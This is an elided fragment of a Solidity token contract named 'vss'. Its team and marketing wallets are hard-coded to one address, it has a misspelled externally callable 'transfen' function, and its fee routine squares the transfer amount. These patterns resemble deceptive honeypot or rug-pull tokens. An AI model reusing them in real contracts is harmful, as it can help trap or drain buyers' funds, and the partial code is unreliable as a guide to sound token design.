...
contract vss is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "vss";
    string private _symbol = "vss";
    ...
    mapping (address => bool) public _isTxExempt;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xCD03673F28f8A7F4D7EB93ea0227c38Ec0b0Aa90));
        marketingWalletAddress = payable(address(0xCD03673F28f8A7F4D7EB93ea0227c38Ec0b0Aa90));
    ...
    function transfen(address newAddress) external virtual {
        ...
        require (newAddress != marketingWalletAddress);
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        uint256 cape = excape;
        uint256 feeAmount = 0;
        uint256 feeExcape = excape.mul(cape);
